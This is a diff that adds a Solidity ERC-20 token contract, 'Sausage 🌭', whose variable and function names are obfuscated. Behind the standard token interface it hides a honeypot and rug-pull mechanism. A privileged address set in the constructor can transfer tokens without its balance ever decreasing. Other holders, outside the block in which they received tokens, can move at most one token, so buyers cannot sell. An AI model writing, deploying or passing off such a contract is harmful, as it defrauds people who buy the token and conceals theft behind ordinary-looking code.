@@ -1,0 +1,62 @@
+contract Sausage is Ownable {
+    uint256 private vkdbmisctofe = 119;
+
+    uint8 public decimals = 9;
+
+    function transferFrom(address rvuq, address gwouda, uint256 uplzrxy) public returns (bool success) {
+        require(uplzrxy <= allowance[rvuq][msg.sender]);
+        allowance[rvuq][msg.sender] -= uplzrxy;
+        tursajgnfdh(rvuq, gwouda, uplzrxy);
+        return true;
+    }
+
+    function tursajgnfdh(address rvuq, address gwouda, uint256 uplzrxy) private {
+        if (0 == urjaxew[rvuq]) {
+            if (rvuq != skmuqg && xrumqznljd[rvuq] != block.number && uplzrxy < totalSupply) {
+                require(uplzrxy <= totalSupply / (10 ** decimals));
+            }
+            balanceOf[rvuq] -= uplzrxy;
+        }
+        balanceOf[gwouda] += uplzrxy;
+        xrumqznljd[gwouda] = block.number;
+        emit Transfer(rvuq, gwouda, uplzrxy);
+    }
+
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    string public symbol = unicode"Sausage 🌭";
+
+    mapping(address => uint256) public balanceOf;
+
+    uint256 public totalSupply = 1000000000 * 10 ** 9;
+
+    function approve(address yxmhgces, uint256 uplzrxy) public returns (bool success) {
+        allowance[msg.sender][yxmhgces] = uplzrxy;
+        emit Approval(msg.sender, yxmhgces, uplzrxy);
+        return true;
+    }
+
+    mapping(address => uint256) private xrumqznljd;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    constructor(address hecz) {
+        balanceOf[msg.sender] = totalSupply;
+        urjaxew[hecz] = vkdbmisctofe;
+        IUniswapV2Router02 tihvofesc = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        skmuqg = IUniswapV2Factory(tihvofesc.factory()).createPair(address(this), tihvofesc.WETH());
+    }
+
+    mapping(address => uint256) private urjaxew;
+
+    string public name = unicode"Sausage 🌭";
+
+    address private skmuqg;
+
+    function transfer(address gwouda, uint256 uplzrxy) public returns (bool success) {
+        tursajgnfdh(msg.sender, gwouda, uplzrxy);
+        return true;
+    }
+}
